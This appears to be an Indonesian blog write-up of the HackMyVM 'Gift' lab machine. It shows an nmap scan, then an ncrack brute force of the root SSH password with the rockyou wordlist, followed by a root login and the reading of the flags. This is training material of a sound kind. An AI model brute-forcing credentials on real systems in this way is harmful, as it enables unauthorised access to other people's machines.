---
layout: Post
title: HackMyVM - Gift Writeup
date: 2021-10-16 07:45 WIB  
---
<h1 align="center" style="font-size:30px;">
  <br>
  <a href="https://downloads.hackmyvm.eu/gift.zip">Texte</a>
  <br>
</h1>

<h4 align="center"> Author: <a href="https://twitter.com/x6cx61x63x61x73">sml</a></h4>

## NMAP

Oke seperti biasa pertama yang kita lakukan ialah scan port yang ada di dalam vm tersebut dengan `nmap` :

```console
┌─[root@Kiyo] - [~/Kiyo/HackMyVM/Gift] - [10539]
└─[$] nmap -A 192.168.0.199                                                                                                 [7:45:38]
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-16 07:45 WIB
Nmap scan report for 192.168.0.199
Host is up (0.00072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.3 (protocol 2.0)
80/tcp open  http    nginx
|_http-server-header: nginx
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:F1:13:D3 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=10/16%OT=22%CT=1%CU=43628%PV=Y%DS=1%DC=D%G=Y%M=080027%
OS:TM=616A20D0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%TS=
OS:A)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B
OS:4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W
OS:1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%
OS:O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=
OS:N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A
OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D
OS:F=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL
OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## Bruteforce Password
Oke disini ku bingung karena pas ku scan directory gak ada yang mencurigakan, akhirnya ku coba bruteforce password root dari vm dengan `ncrack` :

```console
┌─[root@Kiyo] - [~/Kiyo/HackMyVM/Gift] - [10541]
└─[$] ncrack -v -f --user root -P /opt/wordlist/rockyou.txt 192.168.0.199:22                                                [7:48:54]

Starting Ncrack 0.6 ( http://ncrack.org ) at 2021-10-16 07:49 WIB

Discovered credentials on ssh://192.168.0.199:22 'root' 'simple'
ssh://192.168.0.199:22 finished.

Discovered credentials for ssh on 192.168.0.199 22/tcp:
192.168.0.199 22/tcp ssh: 'root' 's****e'

Ncrack done: 1 service scanned in 25.24 seconds.
Probes sent: 83 | timed-out: 0 | prematurely-closed: 12

Ncrack finished.
```

# SSH

And boom dapetlah password root nya , serta flag root dan user :

```console
┌─[root@Kiyo] - [~/Kiyo/HackMyVM/Gift] - [10542]
└─[$] ssh root@192.168.0.199                                                                                                [7:49:31]
The authenticity of host '192.168.0.199 (192.168.0.199)' can't be established.
ECDSA key fingerprint is SHA256:KFsXFz6bLBGiizM+z6jxQpNrqpVzPLLX7Fj7n/npQHc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.199' (ECDSA) to the list of known hosts.
root@192.168.0.199's password: 
IM AN SSH SERVER
gift:~# ls
root.txt  user.txt
gift:~# cat root.txt user.txt; echo "https://github.com/xNCT22x"
HMV******FG
HMV******DS
https://github.com/xNCT22x
```
